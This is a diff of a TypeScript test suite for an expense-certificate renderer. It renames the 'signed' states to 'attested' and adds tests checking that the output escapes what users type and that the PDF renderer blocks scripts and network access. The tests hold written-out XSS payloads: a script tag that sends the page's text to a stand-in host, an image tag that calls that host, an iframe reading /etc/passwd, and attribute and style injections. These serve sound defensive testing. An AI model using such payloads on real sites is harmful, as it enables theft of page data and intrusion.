@@ -158,9 +158,9 @@ describe("the states, and which one is evidence", () => {
   });
 
   it("the path runs forward, and void is always available until it is taken", () => {
-    expect(canMove("DRAFT", "READY_TO_SIGN")).toBe(true);
-    expect(canMove("READY_TO_SIGN", "SIGNED")).toBe(true);
-    expect(canMove("SIGNED", "UPLOADED")).toBe(true);
+    expect(canMove("DRAFT", "READY_TO_ATTEST")).toBe(true);
+    expect(canMove("READY_TO_ATTEST", "ATTESTED")).toBe(true);
+    expect(canMove("ATTESTED", "UPLOADED")).toBe(true);
     expect(canMove("UPLOADED", "LINKED")).toBe(true);
     for (const s of CERTIFICATE_STATES) if (s !== "VOID") expect(canMove(s, "VOID")).toBe(true);
   });
@@ -170,7 +170,7 @@ describe("the states, and which one is evidence", () => {
   });
 
   it("nothing skips ahead to being evidence", () => {
-    for (const s of ["DRAFT", "READY_TO_SIGN", "SIGNED"] as CertificateState[]) {
+    for (const s of ["DRAFT", "READY_TO_ATTEST", "ATTESTED"] as CertificateState[]) {
       expect(canMove(s, "LINKED")).toBe(false);
       expect(moveRefusal(s, "LINKED")).toBeTruthy();
     }
@@ -191,7 +191,7 @@ describe("a waiver that rests on a certificate is worth what the certificate is 
   });
 
   it("approved but not yet filed is NOT evidence", () => {
-    for (const s of ["DRAFT", "READY_TO_SIGN", "SIGNED", "UPLOADED"]) {
+    for (const s of ["DRAFT", "READY_TO_ATTEST", "ATTESTED", "UPLOADED"]) {
       const r = evidenceState(waived(), { c_1: s });
       expect(r.state, `status ${s}`).toBe("BLOCKED");
       expect(r.state === "BLOCKED" && r.reason).toContain("not in use as evidence yet");
@@ -221,8 +221,8 @@ describe("the document itself", () => {
     certificateNo: "CERT-FOLK-TEST-20990401-01-01",
     payload: buildPayload(FACTS, certifiableRows([row(), row({ description: "Bus", price: 15 }), row({ description: "Water", price: 10, expenseType: "meal" })])),
     payloadHash: "a".repeat(64),
-    signerName: "Malee Testsuite", signerRole: "ADMIN",
-    signedAt: "2099-04-03T09:15:00.000Z",
+    attestedByName: "Malee Testsuite", attestedByRole: "ADMIN",
+    attestedAt: "2099-04-03T09:15:00.000Z",
     auditRef: "cert_test_id",
   });
 
@@ -331,5 +331,116 @@ describe("repository invariant — this feature does not claim to be a signature
     for (const f of ["src/lib/certificates/payload.ts", "src/lib/certificates/service.ts", "src/lib/certificates/document.ts"]) {
       expect(code(f), `${f} must not read certifiedAt`).not.toContain("certifiedAt");
     }
+  });
+});
+
+describe("what a person can type cannot become part of the page", () => {
+  // Descriptions come off a job sheet, which an operator types and a guide's own report
+  // can seed. They are text, and the document has to print them as text — not as markup,
+  // not as a script, and not as something that fetches.
+  const attack = (description: string) => {
+    const payload = buildPayload({ ...FACTS, guideName: description }, certifiableRows([row({ description })]));
+    return renderCertificateHtml({
+      certificateNo: description, payload, payloadHash: "b".repeat(64),
+      attestedByName: description, attestedByRole: description,
+      attestedAt: "2099-04-03T09:15:00.000Z", auditRef: description,
+    });
+  };
+
+  it("a script tag is printed, not run", () => {
+    const html = attack('<script>fetch("https://evil.example.test/"+document.body.innerText)</script>');
+    expect(html).not.toContain("<script>fetch");
+    expect(html).toContain("&lt;script&gt;");
+  });
+
+  it("an image that would phone home never becomes a tag", () => {
+    const html = attack('<img src="https://evil.example.test/pixel.png" onerror="alert(1)">');
+    expect(html).not.toMatch(/<img[^>]*evil\.example\.test/);
+    expect(html).toContain("&lt;img");
+  });
+
+  it("a local file cannot be pulled in", () => {
+    const html = attack('<iframe src="file:///etc/passwd"></iframe>');
+    expect(html).not.toContain("<iframe");
+    expect(html).toContain("&lt;iframe");
+  });
+
+  it("an attribute cannot be broken out of, in quotes or backticks", () => {
+    const html = attack('" onload="alert(1)` `');
+    expect(html).not.toContain('onload="alert(1)');
+    expect(html).toContain("&quot;");
+    expect(html).toContain("&#96;");
+  });
+
+  it("a style block cannot be injected to rewrite what the page says", () => {
+    const html = attack("<style>td{display:none}</style>");
+    expect(html).not.toContain("<style>td{display:none}");
+  });
+
+  it("the rendered page pulls in nothing from anywhere", () => {
+    const html = renderCertificateHtml({
+      certificateNo: "CERT-X-01",
+      payload: buildPayload(FACTS, certifiableRows([row()])),
+      payloadHash: "c".repeat(64), attestedByName: "A", attestedByRole: "ADMIN",
+      attestedAt: "2099-04-03T09:15:00.000Z", auditRef: "x",
+    });
+    expect(html).not.toMatch(/<script|<iframe|<object|<embed/i);
+    expect(html).not.toMatch(/src\s*=|@import|url\(\s*["']?(https?|file):/i);
+    expect(html).not.toMatch(/<link\b/i);
+  });
+
+  it("a number that arrived as text prints as a number", () => {
+    // The payload is read back out of a JSON column, so "5" is as likely as 5.
+    const payload = buildPayload(FACTS, certifiableRows([row()]));
+    (payload.rows[0] as unknown as Record<string, unknown>).pax = "<b>9</b>";
+    const html = renderCertificateHtml({
+      certificateNo: "CERT-X-01", payload, payloadHash: "d".repeat(64),
+      attestedByName: "A", attestedByRole: "ADMIN", attestedAt: "2099-04-03T09:15:00.000Z", auditRef: "x",
+    });
+    expect(html).not.toContain("<b>9</b>");
+  });
+});
+
+describe("the renderer's own guarantees", () => {
+  it("it refuses rather than guessing when no Chromium is named", async () => {
+    const src = code("src/lib/certificates/pdf.ts");
+    expect(src).toContain("PDF_UNAVAILABLE");
+    expect(src).toContain("CHROMIUM_PATH");
+  });
+
+  it("it blocks the network and turns scripts off before the page loads", () => {
+    const src = code("src/lib/certificates/pdf.ts");
+    expect(src).toContain("setRequestInterception(true)");
+    expect(src).toContain("setJavaScriptEnabled(false)");
+    // The abort has to come before setContent, or the page has already fetched.
+    expect(src.indexOf("setRequestInterception")).toBeLessThan(src.indexOf("setContent"));
+  });
+
+  it("it renders one at a time — a browser each, on a small container", () => {
+    expect(code("src/lib/certificates/pdf.ts")).toContain("renderQueue");
+  });
+
+  it("it always closes the browser, including when the render throws", () => {
+    const src = code("src/lib/certificates/pdf.ts");
+    expect(src).toMatch(/finally\s*\{[\s\S]*browser\?\.close\(\)/);
+  });
+
+  it("the payment worker never loads it — it has no certificates to render", () => {
+    const worker = readFileSync(join(process.cwd(), "src/workers/payment-worker.ts"), "utf8");
+    expect(worker).not.toContain("certificates/");
+    expect(worker).not.toContain("puppeteer");
+  });
+});
+
+describe("the words the states are described in", () => {
+  it("nothing is called signed any more — a person attested it", () => {
+    for (const f of ["src/lib/certificates/state.ts", "src/lib/certificates/service.ts", "src/components/ExpenseCertificatePanel.tsx"]) {
+      const src = code(f);
+      expect(src, `${f}`).not.toMatch(/\bSIGNED\b|\bREADY_TO_SIGN\b|\bsignedAt\b|\bsignerName\b/);
+    }
+  });
+  it("and ATTESTED still is not evidence", () => {
+    expect(isEvidence("ATTESTED")).toBe(false);
+    expect(canMove("ATTESTED", "LINKED")).toBe(false);
   });
 });
